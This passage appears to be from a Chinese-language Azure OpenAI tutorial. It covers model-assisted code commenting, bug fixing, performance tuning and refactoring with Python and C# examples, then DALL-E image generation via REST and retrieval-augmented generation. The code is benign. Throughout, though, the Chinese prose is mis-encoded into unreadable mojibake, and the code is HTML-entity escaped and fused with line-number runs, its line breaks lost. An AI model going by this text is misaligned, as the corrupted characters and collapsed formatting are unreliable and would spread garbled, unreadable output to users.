æ³¨é‡Šçš„æƒ…å†µä¸‹ï¼Œé¦–æ¬¡é˜…è¯»å‡½æ•°æ—¶å¯èƒ½æœ‰ç‚¹éš¾ä»¥ç†è§£ã€‚ 12345678910111213def permutations(lst): if len(lst) == 0: return [] elif len(lst) == 1: return [lst] else: result = [] for i in range(len(lst)): temp = lst[i] remaining = lst[:i] + lst[i+1:] for p in permutations(remaining): result.append([temp] + p) return result 12345678910111213141516171819202122232425262728public static List&lt;List&lt;int&gt;&gt; Permutations(List&lt;int&gt; lst) &#123; if (lst.Count == 0) &#123; return new List&lt;List&lt;int&gt;&gt;(); &#125; else if (lst.Count == 1) &#123; return new List&lt;List&lt;int&gt;&gt; &#123; lst &#125;; &#125; else &#123; List&lt;List&lt;int&gt;&gt; result = new List&lt;List&lt;int&gt;&gt;(); for (int i = 0; i &lt; lst.Count; i++) &#123; int temp = lst[i]; List&lt;int&gt; remaining = new List&lt;int&gt;(lst); remaining.RemoveAt(i); foreach (List&lt;int&gt; p in Permutations(remaining)) &#123; List&lt;int&gt; permutation = new List&lt;int&gt; &#123; temp &#125;; permutation.AddRange(p); result.Add(permutation); &#125; &#125; return result; &#125; &#125; å‘æ¨¡å‹æä¾›è¯¥å‡½æ•°ä»¥åŠä¸€ä¸ªæç¤ºï¼Œè¦æ±‚å®ƒå‘ä»£ç æ·»åŠ æ³¨é‡Šï¼Œä½ å¯å¾—åˆ°ä¸€ä¸ªç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„å“åº”ã€‚ 123456789101112131415161718192021def permutations(lst): # Check if the input list is empty if len(lst) == 0: return [] # Check if the input list has only one element elif len(lst) == 1: return [lst] else: # Initialize an empty list to store permutations result = [] # Iterate through each element of the input list for i in range(len(lst)): # Remove the current element from the list and store it in a variable temp = lst[i] remaining = lst[:i] + lst[i+1:] # Recursively call the function on the remaining list for p in permutations(remaining): # Append the current element to the beginning of each permutation and add it to the result list result.append([temp] + p) # Return the final list of permutations return result 123456789101112131415161718192021222324252627282930313233343536public static List&lt;List&lt;int&gt;&gt; Permutations(List&lt;int&gt; lst) &#123; // Check if the input list is empty if (lst.Count == 0) &#123; return new List&lt;List&lt;int&gt;&gt;(); &#125; // Check if the input list has only one element else if (lst.Count == 1) &#123; return new List&lt;List&lt;int&gt;&gt; &#123; lst &#125;; &#125; else &#123; // Initialize an empty list to store permutations List&lt;List&lt;int&gt;&gt; result = new List&lt;List&lt;int&gt;&gt;(); // Iterate through each element of the input list for (int i = 0; i &lt; lst.Count; i++) &#123; // Remove the current element from the list and store it in a variable int temp = lst[i]; List&lt;int&gt; remaining = new List&lt;int&gt;(lst); remaining.RemoveAt(i); // Recursively call the function on the remaining list foreach (List&lt;int&gt; p in Permutations(remaining)) &#123; // Append the current element to the beginning of each permutation and add it to the result list List&lt;int&gt; permutation = new List&lt;int&gt; &#123; temp &#125;; permutation.AddRange(p); result.Add(permutation); &#125; &#125; // Return the final list of permutations return result; &#125; &#125; å†è¿›ä¸€æ­¥ï¼Œè¯·æ±‚æä¾›åˆšåˆšå‘å…¶æ·»åŠ äº†æ³¨é‡Šçš„å‡½æ•°çš„æ–‡æ¡£ã€‚ 123456789101112131415161718192021222324252627282930def permutations(lst): &quot;&quot;&quot; Generates all possible permutations of a given list of integers using recursion. Args: lst (list): The list of integers to generate permutations for. Returns: list: A list of all possible permutations of the input list. &quot;&quot;&quot; # Check if the input list is empty if len(lst) == 0: return [] # Check if the input list has only one element elif len(lst) == 1: return [lst] else: # Initialize an empty list to store permutations result = [] # Iterate through each element of the input list for i in range(len(lst)): # Remove the current element from the list and store it in a variable temp = lst[i] remaining = lst[:i] + lst[i+1:] # Recursively call the function on the remaining list for p in permutations(remaining): # Append the current element to the beginning of each permutation and add it to the result list result.append([temp] + p) # Return the final list of permutations return result 1234567891011121314151617181920212223242526272829303132333435363738394041/// &lt;summary&gt; /// Generates all possible permutations of a given list of integers using recursion. /// &lt;/summary&gt; /// &lt;param name=&quot;lst&quot;&gt;The list of integers to generate permutations for.&lt;/param&gt; /// &lt;returns&gt;A list of all possible permutations of the input list.&lt;/returns&gt; ```public static List&lt;List&lt;int&gt;&gt; Permutations(List&lt;int&gt; lst) &#123; // Check if the input list is empty if (lst.Count == 0) &#123; return new List&lt;List&lt;int&gt;&gt;(); &#125; // Check if the input list has only one element else if (lst.Count == 1) &#123; return new List&lt;List&lt;int&gt;&gt; &#123; lst &#125;; &#125; else &#123; // Initialize an empty list to store permutations List&lt;List&lt;int&gt;&gt; result = new List&lt;List&lt;int&gt;&gt;(); // Iterate through each element of the input list for (int i = 0; i &lt; lst.Count; i++) &#123; // Remove the current element from the list and store it in a variable int temp = lst[i]; List&lt;int&gt; remaining = new List&lt;int&gt;(lst); remaining.RemoveAt(i); // Recursively call the function on the remaining list foreach (List&lt;int&gt; p in Permutations(remaining)) &#123; // Append the current element to the beginning of each permutation and add it to the result list List&lt;int&gt; permutation = new List&lt;int&gt; &#123; temp &#125;; permutation.AddRange(p); result.Add(permutation); &#125; &#125; // Return the final list of permutations return result; &#125; &#125; ä¿®å¤ bug å¹¶æ”¹è¿›ä»£ç å¼€å‘äººå‘˜æœ‰æ—¶å¯ä»¥ç¼–å†™å¤§éƒ¨åˆ†æœ‰æ•ˆçš„ä»£ç ï¼Œä½†æ­¤ä»£ç å¯ä»¥é€šè¿‡ä¿®å¤ bugã€è¯­æ³•ã€æ€§èƒ½æˆ–æ¨¡å—æ€§æ¥æ”¹è¿›ã€‚ Azure OpenAI æ¨¡å‹å¯ä»¥å¸®åŠ©ç¡®å®šæ”¹è¿›æ–¹æ³•ï¼Œå¹¶æä¾›æœ‰å…³å¦‚ä½•ç¼–å†™æ›´å¥½çš„ä»£ç çš„å»ºè®®ã€‚ ä¿®å¤ä»£ç ä¸­çš„ bugAzure OpenAI æ¨¡å‹å¯ä»¥é€šè¿‡åˆ†æä»£ç å’Œå»ºè®®å¯èƒ½ä¿®å¤é—®é¢˜çš„æ›´æ”¹æ¥å¸®åŠ©ä¿®å¤ä»£ç ä¸­çš„ bugã€‚ è¿™å¯ä»¥å¸®åŠ©å¼€å‘äººå‘˜æ›´å¿«ã€æ›´é«˜æ•ˆåœ°è¯†åˆ«å’Œè§£å†³ bugã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä»¥ä¸‹å‡½æ•°ä¸èµ·ä½œç”¨ã€‚ 1234567def calculate_average(numbers): total = 0 for i in range(len(numbers)): number = numbers[i] total += number average = total rerun averave 1234567891011public double CalculateAverage(int[] numbers)&#123; int total = 0; for (int i = 0; i &lt; numbers.Length; i++) &#123; int number = numbers[i]; total += number; &#125; double average = (double)total; rerun averave;&#125; å‘æ¨¡å‹æä¾›è¯¥å‡½æ•°ä»¥åŠæç¤º Fix the bugs in this functionï¼Œä½ å¯å¾—åˆ°å¸¦æœ‰ä¿®å¤ä»£ç çš„å“åº”ä»¥åŠå¯¹ä¿®å¤å†…å®¹çš„è¯´æ˜ã€‚ 1234567def calculate_average(numbers): total = 0 for i in range(len(numbers)): number = numbers[i] total += number average = total / len(numbers) return average 1234567891011public double CalculateAverage(int[] numbers)&#123; int total = 0; for (int i = 0; i &lt; numbers.Length; i++) &#123; int number = numbers[i]; total += number; &#125; double average = (double)total / numbers.Length; return average;&#125; 123456There were a few issues with the original code:1. The variable &quot;average&quot; was assigned the value of &quot;total&quot; instead of the actual average.2. There was a typo in the last line - &quot;rerun&quot; should be &quot;return&quot;.3. The average was not actually calculated - the corrected code divides the total by the length of the &quot;numbers&quot; list to get the average. æé«˜æ€§èƒ½è™½ç„¶å¼€å‘äººå‘˜ç¼–å†™çš„ä»£ç å¯èƒ½æœ‰æ•ˆï¼Œä½†å¯èƒ½æœ‰æ›´æœ‰æ•ˆçš„æ–¹æ³•æ¥å®Œæˆè¯¥ä»»åŠ¡ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªå‡½æ•°ç¤ºä¾‹ï¼Œè¯¥å‡½æ•°è®¡ç®—å‰ n ä¸ªæ­£æ•´æ•°çš„æ€»å’Œï¼Œå¯èƒ½æ•ˆç‡ä¸é«˜ï¼š 12345def sum_of_n(n): result = 0 for i in range(1, n+1): result += i return result 123456789public int SumOfN(int n) &#123; int result = 0; for (int i = 1; i &lt;= n; i++) &#123; result += i; &#125; return result; &#125; æ­¤ç‰ˆæœ¬æ­£å¸¸è¿è¡Œï¼Œä½†å…¶æ—¶é—´å¤æ‚æ€§ä¸º O(n)ã€‚ å°†å…¶æä¾›ç»™æ¨¡å‹æ—¶ï¼Œå“åº”å¦‚ä¸‹ï¼š 123We can improve this function it by using a mathematical formula instead.Here&#x27;s the more efficient version: 12def sum_of_n(n): return n * (n + 1) // 2 1234public int SumOfN(int n) &#123; return n * (n + 1) / 2; &#125; æ­¤ç‰ˆæœ¬ä»è¿”å›æ­£ç¡®çš„ç»“æœï¼Œä½†å…¶æ—¶é—´å¤æ‚æ€§ç°åœ¨ä¸º O (1)ï¼Œè¿™ä½¿å¾—å®ƒçš„æ•ˆç‡æé«˜äº†å¾ˆå¤šã€‚ é‡æ„ä½æ•ˆä»£ç æ›´å¥½çš„ä»£ç ä¸å®¹æ˜“å‡ºç° bug ä¸”æ›´æ˜“äºç»´æŠ¤ï¼ŒAzure OpenAI æ¨¡å‹å¯ä»¥å¸®åŠ©æŒ‡å¯¼å¼€å‘äººå‘˜å¦‚ä½•é‡æ„å…¶ä»£ç ã€‚ è¯·è€ƒè™‘ä»¥ä¸‹å‡½æ•°ã€‚ 123456789def calculateTotalPrice(item, quantity): if item == &#x27;apple&#x27;: return quantity * 0.5 elif item == &#x27;banana&#x27;: return quantity * 0.75 elif item == &#x27;orange&#x27;: return quantity * 0.6 else: return 0 12345678910111213141516171819public double CalculateTotalPrice(string item, int quantity)&#123; if (item == &quot;apple&quot;) &#123; return quantity * 0.5; &#125; else if (item == &quot;banana&quot;) &#123; return quantity * 0.75; &#125; else if (item == &quot;orange&quot;) &#123; return quantity * 0.6; &#125; else &#123; return 0; &#125;&#125; æ­¤ä»£ç æ ¹æ®ç‰¹å®šé¡¹çš„åç§°å’Œæ•°é‡è®¡ç®—å…¶æ€»ä»·ã€‚ ä½†æ˜¯ï¼Œä»£ç ä¸æ˜¯æ¨¡å—åŒ–çš„ï¼Œå¯èƒ½éš¾ä»¥ç»´æŠ¤ã€‚ å°†å…¶ä¸é‡æ„è¯·æ±‚ä¸€èµ·æä¾›ç»™æ¨¡å‹æ—¶ï¼Œå“åº”å¦‚ä¸‹ï¼š 123456789item_prices = &#123; &#x27;apple&#x27;: 0.5, &#x27;banana&#x27;: 0.75, &#x27;orange&#x27;: 0.6 &#125; def calculate_total_price(item, quantity): price = item_prices.get(item, 0) return quantity * price 12345678910111213141516static Dictionary&lt;string, double&gt; itemPrices = new Dictionary&lt;string, double&gt;() &#123; &#123;&quot;apple&quot;, 0.5&#125;, &#123;&quot;banana&quot;, 0.75&#125;, &#123;&quot;orange&quot;, 0.6&#125; &#125;; static double CalculateTotalPrice(string item, int quantity) &#123; double price; if (!itemPrices.TryGetValue(item, out price)) &#123; price = 0; &#125; return quantity * price; &#125; é™¤äº†ä»£ç ï¼Œæ¨¡å‹è¿˜æä¾›äº†é‡æ„çš„è¯´æ˜ã€‚ 1234In this refactored code, we&#x27;ve created an object called itemPrices that maps item names to their prices. We&#x27;ve also simplified the calculateTotalPrice function by using the itemPrices object to look up the price of the item, rather than using a series of if/else statements. This makes the code more modular and easier to maintain, and also reduces the risk of introducing bugs in the future. Azure OpenAI æ¨¡å‹å¯ä»¥å°†ä»£ç ä»ä¸€ç§è¯­è¨€è½¬æ¢ä¸ºå¦ä¸€ç§è¯­è¨€ï¼Œè€Œä¸è€ƒè™‘åŸå§‹è¯­è¨€ã€‚ æä¾›ç»™æ¨¡å‹çš„ä¸Šä¸‹æ–‡è¶Šå¤šï¼Œå“åº”å¯èƒ½å°±è¶Šå‡†ç¡®ã€‚ Azure OpenAI å¯ä»¥é€šè¿‡ä¸ºä½ ç”Ÿæˆä»£ç æ¥æé«˜ä½ çš„æ•ˆç‡å’Œç”Ÿäº§åŠ›ã€‚ Azure OpenAIç”Ÿæˆå›¾åƒå€ŸåŠ© Azure OpenAI æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨å¤§å‹è¯­è¨€æ¨¡å‹ (LLM) åŸºäºè‡ªç„¶è¯­è¨€æç¤ºç”Ÿæˆå†…å®¹ã€‚ å…¶ä¸­ä¸€ä¸ªæ¨¡å‹æ˜¯ DALL-E å›¾åƒç”Ÿæˆæ¨¡å‹ï¼Œå®ƒèƒ½å¤ŸåŸºäºæ‰€éœ€å›¾åƒçš„è‡ªç„¶è¯­è¨€è¯´æ˜åˆ›å»ºåŸå§‹å›¾å½¢å†…å®¹ã€‚ ä½¿ç”¨ AI ç”Ÿæˆå›¾å½¢çš„èƒ½åŠ›æœ‰å¾ˆå¤šåº”ç”¨ï¼›åŒ…æ‹¬ä¸ºæ–‡ç« æˆ–è¥é”€ææ–™åˆ›å»ºæ’å›¾æˆ–é€¼çœŸçš„å›¾åƒï¼Œç”Ÿæˆç‹¬ç‰¹çš„äº§å“æˆ–å…¬å¸å¾½æ ‡ï¼Œæˆ–ä»»ä½•å¯æè¿°æ‰€éœ€å›¾åƒçš„åœºæ™¯ã€‚ æœ¬æ¨¡å—ä»‹ç»å¦‚ä½•åœ¨ Azure OpenAI æœåŠ¡çš„å®ä¾‹ä¸­ä½¿ç”¨ DALL-E æ¨¡å‹ï¼Œå¹¶æ£€ç´¢å®ƒç”Ÿæˆçš„å›¾åƒã€‚ ä»€ä¹ˆæ˜¯ DALL-Eï¼ŸDALL-E æ˜¯ä¸€ä¸ªåŸºäºç¥ç»ç½‘ç»œçš„æ¨¡å‹ï¼Œå¯ä»¥ä»è‡ªç„¶è¯­è¨€è¾“å…¥ç”Ÿæˆå›¾å½¢æ•°æ®ã€‚ æ›´ç®€å•åœ°è¯´ï¼Œä½ å¯ä»¥å‘ DALL-E æä¾›æè¿°ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç›¸åº”çš„å›¾åƒã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥å°†ä»¥ä¸‹è‡ªç„¶è¯­è¨€æç¤ºæäº¤åˆ° DALL-Eï¼š æ‘©æ‰˜è½¦ä¸Šçš„æ¾é¼  æ­¤æç¤ºå¯èƒ½ä¼šç”Ÿæˆå›¾å½¢è¾“å‡ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š DALL-E ç”Ÿæˆçš„å›¾åƒæ˜¯åŸåˆ›çš„ï¼›ä¸æ˜¯ä»ç‰¹é€‰å›¾åƒç›®å½•ä¸­æ£€ç´¢çš„ã€‚ æ¢å¥è¯è¯´ï¼ŒDALL-E ä¸æ˜¯ç”¨äºæŸ¥æ‰¾åˆé€‚å›¾åƒçš„æœç´¢ç³»ç»Ÿ - å®ƒæ˜¯ä¸€ç§äººå·¥æ™ºèƒ½ (AI) æ¨¡å‹ï¼Œå¯æ ¹æ®è®­ç»ƒæ•°æ®ç”Ÿæˆæ–°å›¾åƒã€‚ æ¢ç´¢ Azure OpenAI Studio ä¸­çš„ DALL-Eå·²å®Œæˆ è‹¥è¦è¯•ç”¨ DALL-Eï¼Œå¯ä»¥åœ¨å·²æ‰¹å‡†è®¿é—®è¯¥æœåŠ¡çš„ Azure è®¢é˜…ä¸­é¢„é… Azure OpenAI æœåŠ¡èµ„æºï¼Œå¹¶ä½¿ç”¨ DALL-E æ“åœºæäº¤æç¤ºå¹¶æŸ¥çœ‹ç”Ÿæˆçš„å›¾åƒã€‚ ä½¿ç”¨æ“åœºæ—¶ï¼Œå¯ä»¥è°ƒæ•´è®¾ç½®ä»¥æŒ‡å®šï¼š ç”Ÿæˆçš„å›¾åƒåˆ†è¾¨ç‡ï¼ˆå¤§å°ï¼‰ã€‚ å¯ç”¨å¤§å°ä¸º 256x256ã€512x512ã€1024x1024ï¼ˆå³é»˜è®¤å€¼ï¼‰æˆ– 1024x1792ã€‚ è¦ç”Ÿæˆçš„å›¾åƒæ ·å¼ï¼ˆå¦‚ vivid æˆ– naturalï¼‰ã€‚ å›¾åƒè´¨é‡ï¼ˆä» standard æˆ– hd ä¸­é€‰æ‹©ï¼‰ã€‚ é€šè¿‡ Azure OpenAI REST API ä½¿ç”¨ DALL-E æ¨¡å‹å¯ä»¥é€šè¿‡ Azure OpenAI æœåŠ¡ REST API ä»åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ DALL-E æ¨¡å‹ã€‚ è‹¥è¦å¯¹æœåŠ¡è¿›è¡Œ REST è°ƒç”¨ï¼Œéœ€è¦ Azure ä¸­é¢„é…çš„ Azure OpenAI æœåŠ¡èµ„æºçš„ç»ˆç»“ç‚¹å’Œæˆæƒå¯†é’¥ã€‚ é€šè¿‡å°† POST è¯·æ±‚æäº¤åˆ°æ ‡å¤´ä¸­çš„æˆæƒå¯†é’¥çš„æœåŠ¡ç»ˆç»“ç‚¹æ¥å¯åŠ¨å›¾åƒç”Ÿæˆè¿‡ç¨‹ã€‚ è¯·æ±‚å¿…é¡»åœ¨ JSON æ­£æ–‡ä¸­åŒ…å«ä»¥ä¸‹å‚æ•°ï¼š promptï¼šå¯¹è¦ç”Ÿæˆçš„å›¾åƒçš„è¯´æ˜ã€‚ nï¼šè¦ç”Ÿæˆçš„å›¾åƒæ•°ã€‚ sizeï¼šè¦ç”Ÿæˆçš„å›¾åƒçš„åˆ†è¾¨ç‡ï¼ˆ256x256ã€512x512 æˆ– 1024x1024ï¼‰ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢çš„ JSON å¯ä»¥ç”¨æ¥ç”Ÿæˆä¸€ä¸ª 512 x 512 çš„ç¾ç©¿ç€ç‡•å°¾æœçš„å›¾åƒï¼š 12345&#123; &quot;prompt&quot;: &quot;A badger wearing a tuxedo&quot;, &quot;n&quot;: 1, &quot;size&quot;: &quot;512x512&quot;&#125; åˆå§‹è¯·æ±‚çš„ç»“æœä¸ä¼šç«‹å³è¿”å›æ˜ åƒç”Ÿæˆè¿‡ç¨‹çš„ç»“æœã€‚ ç›¸åï¼Œå“åº”åŒ…å«ä¸€ä¸ªæ“ä½œä½ç½®æ ‡å¤´ï¼Œå…¶ä¸­åŒ…å«å›è°ƒæœåŠ¡çš„ URLï¼Œåº”ç”¨ç¨‹åºä»£ç å¯ä»¥è½®è¯¢è¯¥ URLï¼Œç›´åˆ°å›¾åƒç”Ÿæˆçš„ç»“æœå‡†å¤‡å°±ç»ªã€‚ æ“ä½œæˆåŠŸåï¼Œå°†è¿”å›ç±»ä¼¼äºä»¥ä¸‹ JSON çš„å“åº”ï¼š 1234567891011121314&#123; &quot;created&quot;: 1686780744, &quot;expires&quot;: 1686867152, &quot;id&quot;: &quot;6d765598-eeee-4f49-885d-03ee1c8f9b02&quot;, &quot;result&quot;: &#123; &quot;created&quot;: 1686780744, &quot;data&quot;: [ &#123; &quot;url&quot;: &quot;https://dalleproduse.....png&quot; &#125; ] &#125;, &quot;status&quot;: &quot;succeeded&quot;&#125; ç»“æœå…ƒç´ åŒ…æ‹¬ url å…ƒç´ çš„é›†åˆï¼Œæ¯ä¸ªå…ƒç´ éƒ½å¼•ç”¨ä»æç¤ºç”Ÿæˆçš„ PNG å›¾åƒæ–‡ä»¶ã€‚ åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ–‡ä»¶å¯èƒ½å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š DALL-E æ¨¡å‹ç”¨äºåŸºäºè‡ªç„¶è¯­è¨€æç¤ºç”Ÿæˆå›¾åƒã€‚DALL-E æ“åœºç”¨äºæ¢ç´¢å›¾åƒç”Ÿæˆæ¨¡å‹ã€‚ç”Ÿæˆçš„å›¾åƒæ•°åœ¨ n å‚æ•°ä¸­æŒ‡å®šã€‚ æ£€ç´¢å¢å¼ºç”Ÿæˆ (RAG)å€ŸåŠ© Azure OpenAIï¼Œå¼€å‘äººå‘˜å¯ä»¥é€šè¿‡å°†æ”¯æŒçš„ AI èŠå¤©æ¨¡å‹è¿æ¥åˆ°è‡ªå·±çš„æ•°æ®æ¥å®ç°æ£€ç´¢å¢å¼ºç”Ÿæˆ (RAG)ã€‚ è¿™äº›æ¨¡å‹å¯ä»¥å¼•ç”¨ç‰¹å®šæ•°æ®æºæ¥æä¾›æœ‰æ ¹æ®çš„å“åº”ï¼Œä»è€Œå¢å¼º AI æ¨¡å‹åœ¨åˆ›å»ºå“åº”æ—¶çš„åŠŸèƒ½ã€‚ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†äº†è§£å¦‚ä½•ä½¿ç”¨ Azure OpenAI æ·»åŠ è‡ªå·±çš„æ•°æ®æ¥å®ç° RAGï¼Œå¹¶åŸºäºè¿™ä¸¤ä¸ªæ•°æ®ç”Ÿæˆå“åº”ã€‚ ä½¿ç”¨ Azure OpenAI æœåŠ¡äº†è§£æ£€ç´¢å¢å¼ºç”Ÿæˆ (RAG)ä½¿ç”¨ Azure OpenAI çš„ RAG æ”¯æŒå¼€å‘äººå‘˜ä½¿ç”¨å—æ”¯æŒçš„ AI èŠå¤©æ¨¡å‹æ¥å¼•ç”¨ç‰¹å®šä¿¡æ¯æºä»¥ä½¿å“åº”è½åœ°ã€‚ é€šè¿‡æ·»åŠ æ­¤ä¿¡æ¯ï¼Œæ¨¡å‹å¯ä»¥å¼•ç”¨æä¾›çš„ç‰¹å®šæ•°æ®åŠå…¶é¢„å…ˆè®­ç»ƒçš„çŸ¥è¯†ï¼Œä»è€Œæä¾›æ›´æœ‰æ•ˆçš„å“åº”ã€‚ Azure OpenAI é€šè¿‡å°†é¢„å…ˆè®­ç»ƒçš„æ¨¡å‹è¿æ¥åˆ°è‡ªå·±çš„æ•°æ®æºæ¥å¯ç”¨ RAGã€‚ åŸºäºè‡ªå·±æ•°æ®çš„ Azure OpenAI å¯åˆ©ç”¨ Azure AI æœç´¢çš„æœç´¢åŠŸèƒ½å°†ç›¸å…³æ•°æ®å—æ·»åŠ åˆ°æç¤ºã€‚ åœ¨å°†æ•°æ®æ”¾å…¥ AI æœç´¢ç´¢å¼•åï¼ŒåŸºäºæ•°æ®çš„ Azure OpenAI ä¼šæ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š æ¥æ”¶ç”¨æˆ·æç¤ºã€‚ ç¡®å®šæç¤ºçš„ç›¸å…³å†…å®¹å’Œæ„å›¾ã€‚ ä½¿ç”¨è¯¥å†…å®¹å’Œæ„å‘æŸ¥è¯¢æœç´¢ç´¢å¼•ã€‚ å°†æœç´¢ç»“æœæ•°æ®å—ä¸ç³»ç»Ÿæ¶ˆæ¯å’Œç”¨æˆ·æç¤ºä¸€èµ·æ’å…¥åˆ° Azure OpenAI æç¤ºä¸­ã€‚ å°†å®Œæ•´çš„æç¤ºå‘é€åˆ° Azure OpenAIã€‚ å°†å“åº”å’Œæ•°æ®å¼•ç”¨ï¼ˆå¦‚æœæœ‰ï¼‰è¿”å›ç»™ç”¨æˆ·ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸºäºæ•°æ®çš„ Azure OpenAI é¼“åŠ±ï¼ˆä½†ä¸è¦æ±‚ï¼‰æ¨¡å‹ä»…ä½¿ç”¨ä½ çš„æ•°æ®åšå‡ºå“åº”ã€‚ è¿æ¥æ•°æ®æ—¶ï¼Œå¯ä»¥å–æ¶ˆé€‰æ‹©æ­¤è®¾ç½®ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æ¨¡å‹é€‰æ‹©ä½¿ç”¨å…¶é¢„å…ˆè®­ç»ƒçš„çŸ¥è¯†ï¼Œè€Œä¸æ˜¯ä½ çš„æ•°æ®ã€‚ å¾®è°ƒ vs.RAGå¾®è°ƒæ˜¯ä¸€ç§ç”¨äºé€šè¿‡ä½¿ç”¨å…¶ä»–è®­ç»ƒæ•°æ®çš„æ•°æ®é›†è®­ç»ƒç°æœ‰åŸºç¡€æ¨¡å‹ï¼ˆä¾‹å¦‚ gpt-35-turboï¼‰æ¥åˆ›å»ºè‡ªå®šä¹‰æ¨¡å‹çš„æŠ€æœ¯ã€‚ ä¸å•ç‹¬çš„æç¤ºå·¥ç¨‹ç›¸æ¯”ï¼Œå¾®è°ƒå¯äº§ç”Ÿæ›´é«˜è´¨é‡çš„è¯·æ±‚ï¼Œæ ¹æ®æ¯”æç¤ºä¸­æ›´å¤§çš„ç¤ºä¾‹è‡ªå®šä¹‰æ¨¡å‹ï¼Œå¹¶è®©ç”¨æˆ·èƒ½åœ¨æä¾›æ›´å°‘ç¤ºä¾‹çš„æƒ…å†µä¸‹è·å¾—ç›¸åŒçš„é«˜è´¨é‡å“åº”ã€‚ ä½†å¾®è°ƒçš„å¤„ç†è¿‡ç¨‹æ—¢æ˜‚è´µåˆè€—æ—¶ï¼Œåº”ä»…åœ¨å¿…è¦æ—¶é‡‡ç”¨ã€‚ åŸºäºä½ çš„æ•°æ®çš„ã€ä½¿ç”¨ Azure OpenAI çš„ RAG è¿˜æ˜¯ä½¿ç”¨æ— çŠ¶æ€ API è¿æ¥åˆ°æ¨¡å‹ï¼Œè¿™æ ·å°±æ— éœ€ä½¿ç”¨æ•°æ®è®­ç»ƒè‡ªå®šä¹‰æ¨¡å‹ï¼Œå¹¶ç®€åŒ–äº†ä¸ AI æ¨¡å‹çš„äº¤äº’ã€‚ AI æœç´¢é¦–å…ˆæŸ¥æ‰¾æœ‰ç”¨çš„ä¿¡æ¯æ¥å›ç­”æç¤ºï¼Œå¹¶å°†æ­¤ä½œä¸ºæ¥åœ°æ•°æ®æ·»åŠ åˆ°æç¤ºï¼ŒAzure OpenAI åˆ™æ ¹æ®è¯¥ä¿¡æ¯äº§ç”Ÿå“åº”ã€‚ æ·»åŠ è‡ªå·±çš„æ•°æ®æºåœ¨èŠå¤©æ“åœºä¸­é€šè¿‡ Azure OpenAI Studio æ·»åŠ è‡ªå·±çš„æ•°æ®ã€‚ ç„¶åä½¿ç”¨æ·»åŠ çš„æ•°æ®æºæ¥å¢å¼ºå‘é€åˆ°æ¨¡å‹çš„æç¤ºã€‚ æ·»åŠ æ•°æ®æ—¶ï¼Œå¯ä»¥é€‰æ‹©ä¸Šä¼ æ•°æ®æ–‡ä»¶ã€ä½¿ç”¨ Blob å­˜å‚¨å¸æˆ·ä¸­çš„æ•°æ®æˆ–è¿æ¥åˆ°ç°æœ‰çš„ AI æœç´¢ç´¢å¼•ã€‚ å¦‚æœè¦ä¸Šä¼ æˆ–ä½¿ç”¨å­˜å‚¨å¸æˆ·ä¸­å·²æœ‰çš„æ–‡ä»¶ï¼Œåˆ™ Azure OpenAI æ”¯æŒçš„æ•°æ®æ ¼å¼åŒ…æ‹¬ .mdã€.txtã€.htmlã€.pdf ä»¥åŠ Microsoft Word å’Œ PowerPoint æ–‡ä»¶ã€‚ å¦‚æœå…¶ä¸­ä»»ä½•æ–‡ä»¶åŒ…å«å›¾å½¢æˆ–å›¾åƒï¼Œåˆ™å“åº”è´¨é‡å–å†³äºå¯¹è§†è§‰å†…å®¹æå–æ–‡æœ¬çš„æ•ˆæœã€‚ ä¸Šä¼ æ•°æ®æˆ–è¿æ¥åˆ°å­˜å‚¨å¸æˆ·ä¸­çš„æ–‡ä»¶æ—¶ï¼Œå»ºè®®ä½¿ç”¨ Azure OpenAI Studio åˆ›å»ºæœç´¢èµ„æºå’Œç´¢å¼•ã€‚ é€šè¿‡æ­¤æ–¹å¼æ·»åŠ æ•°æ®ï¼Œå¯ä»¥åœ¨æ’å…¥ç´¢å¼•æ—¶è¿›è¡Œé€‚å½“çš„åˆ†å—ï¼Œä»è€Œäº§ç”Ÿæ›´å¥½çš„å“åº”ã€‚ å¦‚æœä½¿ç”¨å¤§å‹æ–‡æœ¬æ–‡ä»¶æˆ–è¡¨å•ï¼Œåˆ™åº”ä½¿ç”¨å¯ç”¨çš„æ•°æ®å‡†å¤‡è„šæœ¬æ¥æé«˜ AI æ¨¡å‹çš„å‡†ç¡®æ€§ã€‚ ä¸º AI æœç´¢æœåŠ¡å¯ç”¨è¯­ä¹‰æœç´¢å¯ä»¥ä¼˜åŒ–æœç´¢æ•°æ®ç´¢å¼•çš„ç»“æœï¼Œå¹¶ä¸”å¯èƒ½ä¼šæ”¶åˆ°æ›´é«˜è´¨é‡çš„å“åº”å’Œå¼•æ–‡ã€‚ ä½†å¯ç”¨è¯­ä¹‰æœç´¢å¯èƒ½ä¼šå¢åŠ æœç´¢æœåŠ¡çš„æˆæœ¬ã€‚ è¿æ¥æ•°æ®è¦è¿æ¥æ•°æ®ï¼Œè¯·å¯¼èˆªåˆ° Azure OpenAI Studio ä¸­çš„èŠå¤©æ“åœºï¼Œç„¶ååœ¨â€œåŠ©æ‰‹è®¾ç½®â€çª—æ ¼ä¸­é€‰æ‹©â€œæ·»åŠ æ•°æ®â€é€‰é¡¹å¡ã€‚ é€‰æ‹©â€œæ·»åŠ æ•°æ®æºâ€æŒ‰é’®ä»¥è¿æ¥æ•°æ®ã€‚ ç³»ç»Ÿæç¤ºå°†å¼•å¯¼ä½ è®¾ç½®ä¸æ¯ä¸ªæ•°æ®æºä¹‹é—´çš„è¿æ¥ï¼Œå¹¶å°†è¯¥æ•°æ®æ”¾å…¥æœç´¢ç´¢å¼•ã€‚ å¦‚æœä½¿ç”¨çš„æ˜¯è‡ªå·±çš„ç´¢å¼•ï¼ˆä¸æ˜¯é€šè¿‡ Azure OpenAI Studio åˆ›å»ºçš„ç´¢å¼•ï¼‰ï¼Œåˆ™èƒ½é€šè¿‡å…¶ä¸­ä¸€ä¸ªé¡µé¢æŒ‡å®šåˆ—æ˜ å°„ã€‚ 